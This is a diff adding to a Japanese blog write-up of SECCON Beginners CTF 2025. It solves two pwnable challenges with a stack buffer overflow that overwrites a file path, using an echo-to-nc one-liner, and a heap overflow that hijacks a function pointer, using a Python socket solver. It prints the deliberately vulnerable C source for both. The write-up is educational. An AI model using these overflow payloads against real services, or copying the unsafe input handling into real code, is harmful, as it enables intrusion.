@@ -5,6 +5,11 @@ type: "tech" # tech: 技術記事 / idea: アイデア
 topics: [CTF]
 published: false
 ---
+# はじめに
+母校の後輩とSECCON Beginners CTF 2025に参加したアヤノです。
+
+今回のCTFはあまり参加する時間が取れなかったので、開催後に解けそうな問題を全て時、Writeupを作成しました。
+
 # welcome
 ## welcome (100pt / 865 solves)
 > SECCON Beginners CTF 2025へようこそ Flagは >
@@ -657,19 +662,217 @@ print("Flag:", flag)
 ```
 # pwnable
 ## pet_name (100pt / 586 solves)
+> ペットに名前を付けましょう。ちなみにフラグは/home/pwn/flag.txtに書いてあるみたいです。
+> 
+> nc pet-name.challenges.beginners.seccon.jp 9080
 
+この問題のプログラムを確認すると、`et_name[32]` と `path[128]` が連続してメモリに配置されているので、バッファオーバーフローを利用して `pet_name`の値を上書きすることで、フラグがありそうな`/home/pwn/flag.txt`を取得できそう。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void init() {
+    // You don't need to read this because it's just initialization
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+}
+
+int main() {
+    init();
+
+    char pet_name[32] = {0};
+    char path[128] = "/home/pwn/pet_sound.txt";
+
+    printf("Your pet name?: ");
+    scanf("%s", pet_name);
+
+    FILE *fp = fopen(path, "r");
+    if (fp) {
+        char buf[256] = {0};
+        if (fgets(buf, sizeof(buf), fp) != NULL) {
+            printf("%s sound: %s\n", pet_name, buf);
+        } else {
+            puts("Failed to read the file.");
+        }
+        fclose(fp);
+    } else {
+        printf("File not found: %s\n", path);
+    }
+    return 0;
+}
+```
+
+フラグを得るために32文字の後に`/home/pwn/flag.txt`を入力するコマンドを実行する。コマンドの実行結果からこの問題のフラグである「ctf4b{3xp1oit_pet_n4me!}」が得れれる。
+
+```
+echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/pwn/flag.txt" | nc pet-name.challenges.beginners.seccon.jp 9080
+```
 
 ## pet_sound (100pt / 410 solves)
+> ペットに鳴き声を教えましょう。
+> 
+> nc pet-sound.challenges.beginners.seccon.jp 9090
 
-## pivot4b (394pt / 117 solves)
+この問題のプログラムを確認すると、`pet_A` と `pet_B` の構造体が連続してメモリに配置されており、`pet_A->sound` に50バイト書き込むと、`pet_A->speak` はもちろん、`pet_B->speak` までバッファオーバーフローで書き換えられる。これを利用して、`pet_B->speak` 関数ポインタを書き換え、`speak_flag` のアドレスを入れてフラグを取得する。
 
-## pivot4b++ (496pt / 25 solves)
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 
-## TimeOfControl (499pt / 15 solves)
+struct Pet;
+void speak_flag(struct Pet *p);
+void speak_sound(struct Pet *p);
+void visualize_heap(struct Pet *a, struct Pet *b);
 
+struct Pet {
+    void (*speak)(struct Pet *p);
+    char sound[32];
+};
 
-# メモ
-私が解けなかった問題(memo4b, login4b, Elliptic4b, mathmyth, Golden Ticket, kingyo_sukui, MAFC, code_injection, )のWriteupが書かれているサイトを纏める
+int main() {
+    struct Pet *pet_A, *pet_B;
+
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+
+    puts("--- Pet Hijacking ---");
+    puts("Your mission: Make Pet speak the secret FLAG!\n");
+    printf("[hint] The secret action 'speak_flag' is at: %p\n", speak_flag);
+
+    pet_A = malloc(sizeof(struct Pet));
+    pet_B = malloc(sizeof(struct Pet));
+
+    pet_A->speak = speak_sound;
+    strcpy(pet_A->sound, "wan...");
+    pet_B->speak = speak_sound;
+    strcpy(pet_B->sound, "wan...");
+
+    printf("[*] Pet A is allocated at: %p\n", pet_A);
+    printf("[*] Pet B is allocated at: %p\n", pet_B);
+    
+    puts("\n[Initial Heap State]");
+    visualize_heap(pet_A, pet_B);
+
+    printf("\n");
+    printf("Input a new cry for Pet A > ");
+    read(0, pet_A->sound, 0x32);
+
+    puts("\n[Heap State After Input]");
+    visualize_heap(pet_A, pet_B);
+
+    pet_A->speak(pet_A);
+    pet_B->speak(pet_B);
+
+    free(pet_A);
+    free(pet_B);
+    return 0;
+}
+
+void speak_flag(struct Pet *p) {
+    char flag[64] = {0};
+    FILE *f = fopen("flag.txt", "r");
+    if (f == NULL) {
+        puts("\nPet seems to want to say something, but can't find 'flag.txt'...");
+        return;
+    }
+    fgets(flag, sizeof(flag), f);
+    fclose(f);
+    flag[strcspn(flag, "\n")] = '\0';
+
+    puts("\n**********************************************");
+    puts("* Pet suddenly starts speaking flag.txt...!? *");
+    printf("* Pet: \"%s\" *\n", flag);
+    puts("**********************************************");
+    exit(0);
+}
+
+void speak_sound(struct Pet *p) {
+    printf("Pet says: %s\n", p->sound);
+}
+
+void visualize_heap(struct Pet *a, struct Pet *b) {
+    unsigned long long *ptr = (unsigned long long *)a;
+    puts("\n--- Heap Layout Visualization ---");
+    for (int i = 0; i < 12; i++, ptr++) {
+        printf("0x%016llx: 0x%016llx", (unsigned long long)ptr, *ptr);
+        if (ptr == (unsigned long long *)&a->speak) printf(" <-- pet_A->speak");
+        if (ptr == (unsigned long long *)a->sound)   printf(" <-- pet_A->sound");
+        if (ptr == (unsigned long long *)&b->speak) printf(" <-- pet_B->speak (TARGET!)");
+        if (ptr == (unsigned long long *)b->sound)   printf(" <-- pet_B->sound");
+        puts("");
+    }
+    puts("---------------------------------");
+}
+```
+
+バッファオーバーフローを引き起こすソルバーを作成し、実行してみる。実行の結果、この問題のフラグである「ctf4b{y0u_expl0it_0v3rfl0w!}」が得られる。
+
+```py
+import socket
+import struct
+import re
+
+HOST = "pet-sound.challenges.beginners.seccon.jp"
+PORT = 9090
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+
+    data = b""
+    speak_flag_addr = None
+
+    # まずヒント行を含めた初期データを受信しつつアドレスを抽出
+    while True:
+        chunk = s.recv(1024)
+        if not chunk:
+            break
+        data += chunk
+        text = data.decode(errors="ignore")
+        # 正規表現でアドレス抽出
+        m = re.search(r"\[hint\] The secret action 'speak_flag' is at: (0x[0-9a-fA-F]+)", text)
+        if m:
+            speak_flag_addr = int(m.group(1), 16)
+            break
+    print(f"speak_flag address found: {hex(speak_flag_addr)}")
+
+    # プロンプトまで読み続ける
+    while b"Input a new cry for Pet A >" not in data:
+        chunk = s.recv(1024)
+        if not chunk:
+            break
+        data += chunk
+    print(data.decode(errors="ignore"))
+
+    # payload作成
+    payload = b"A" * 0x28 + struct.pack("<Q", speak_flag_addr)
+
+    # 送信
+    s.sendall(payload)
+
+    # フラグ含む応答を受信し続ける
+    response = b""
+    while True:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        response += chunk
+    print(response.decode(errors="ignore"))
+```
+
+# おわりに
+私が解けたSECCON Beginners CTF 2025のWriteupを作成しました。
+全完した分野が一つも無かったので、残念です。来年こそは全完した分野が出るように勉強を頑張ります。
+
+今回のCTFのバックアップは作成しているので、時間がある時に解けなかった問題を他の人が書いたWriteupを参考にして解きたいです。
+
+```
+解けなかった問題：memo4b, login4b, Elliptic4b, mathmyth, Golden Ticket, kingyo_sukui, MAFC, code_injection,　pivot4b, pivot4b++, TimeOfControl
+```
 
 - [SECCON Beginners CTF 2025 作問者Writeup (Crypto)](https://yu212.hatenablog.com/entry/2025/07/27/163347)
 - [SECCON Beginners CTF 2025 Writeup](https://hack.nikkei.com/blog/seccon_beginners_2025_writeup/)
